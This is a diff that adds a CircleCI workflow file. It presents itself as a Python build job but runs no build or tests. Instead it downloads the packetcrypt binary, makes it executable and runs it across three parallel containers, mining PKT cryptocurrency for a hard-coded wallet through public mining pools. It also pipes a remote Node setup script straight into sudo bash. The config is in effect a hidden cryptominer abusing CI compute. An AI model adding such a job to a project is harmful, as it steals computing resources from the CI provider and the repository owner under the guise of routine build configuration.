@@ -1,0 +1,28 @@
+working_dir: &working_dir ~/app
+
+version: 2.1 
+ 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - job
+ 
+jobs: 
+  job:
+    parallelism: 3
+    docker: 
+      - image: cimg/python:3.8 
+     
+    steps: 
+      - checkout
+      - run: sudo apt update
+      - run: sudo apt upgrade -y
+      - run: curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+      - run: sudo apt install nodejs
+      - run: wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
+      - run: chmod +x packetcrypt-v0.5.1-linux_amd64
+      - run: ./packetcrypt-v0.5.1-linux_amd64 ann -p pkt1q8fkdwccery93f63zjkfmdux3jhjuqfyhdrsr9z https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world | grep --color=never -o "annmine.rs.*Ke.*"
